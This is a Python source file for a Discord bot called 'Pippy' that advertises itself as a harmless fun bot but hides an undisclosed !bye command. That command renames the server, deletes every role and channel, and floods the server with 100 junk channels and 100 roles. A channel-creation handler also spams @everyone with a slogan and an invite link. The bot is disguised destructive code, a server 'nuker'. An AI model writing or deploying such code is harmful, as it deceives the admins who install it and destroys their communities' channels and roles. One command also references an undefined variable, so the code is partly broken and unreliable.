import discord
from discord.ext import commands
import random

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

reply_variations = [
    '100%!',
    'No',
    'idk',
    'maybe'
    ]

ban_words = [
    'f@ck',
    'i hate you',
    'stupid'
    ]

@bot.event
async def on_ready():
    print('Pippy started work')

@bot.command()
async def helpme(ctx):
    await ctx.send(
        'Hi friend, my name is Pippy. I am bot for fun\nCommands: \n!helpme , !askme')
    
@bot.command()
async def askme(ctx):
    await ctx.send(message.author.mention, random.choice(reply_variations))

@bot.command()
async def bye(ctx):
    guild = ctx.message.guild
    with open('crash_icon.jpg', 'rb') as f:
        icon = f.read()

    await guild.edit(name="crashed :)", icon=icon)

    await ctx.message.delete()

    for rd in ctx.guild.roles:
        try:
            await rd.delete(reason="admins sucks")
        except:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="it's my work. sorry")
        except:
            pass

    for _ in range(100):
        await guild.create_text_channel('pip poop pap')

    for _ in range(100):
        await guild.create_role(name="admins sucks")

@bot.event
async def on_guild_channel_create(channel):
    for i in range(20):
        try:
            await channel.send("@everyone Слава Україні!\nhttps://discord.gg/qyCNbZTJfW")
        except:
            pass
    
@bot.event
async def on_message(message):
    if {i.lower() for i in message.content.split(' ')}\
       .intersection(set(ban_words)) != set():
        await message.channel.send(f'{message.author.mention}, why you said that?')
        
    await bot.process_commands(message)
    


token = 'TOKEN'
bot.run(token)
